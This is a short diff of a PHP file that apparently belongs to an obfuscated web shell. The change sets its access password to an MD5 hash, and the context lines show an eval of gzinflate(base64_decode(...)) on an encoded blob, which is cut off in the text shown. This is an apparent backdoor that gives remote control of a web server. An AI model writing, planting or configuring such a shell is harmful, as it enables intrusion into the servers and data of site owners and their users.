@@ -7,7 +7,7 @@
 //
 // encrypt your password to md5 here http://kerinci.net/?x=decode
 
-$s_pass = ""; // password (default is: kerinci)
+$s_pass = "285F50029090AF5DE63C79700C4C4565"; // password (default is: kerinci)
 
 eval("?>".gzinflate(base64_decode("7b1nm+M2sij82R/Of9Bq593pXvUMxaA0yVc550jZvv0wkxKTGEX5+r+/AEhKlFrq7vGM1z7nePx4hkIoFApVh
 QJQQH360ZTN/0qlBMsyrEdLMA3LUXTpLnv/MfV/bMF5dBRNeFQVTXFQ2hv7UWc0IfU5lWbJArVNoyRPsGAK8T6L42GKozgqLBWVf59Opd+HBT+mFPHuH4oNg
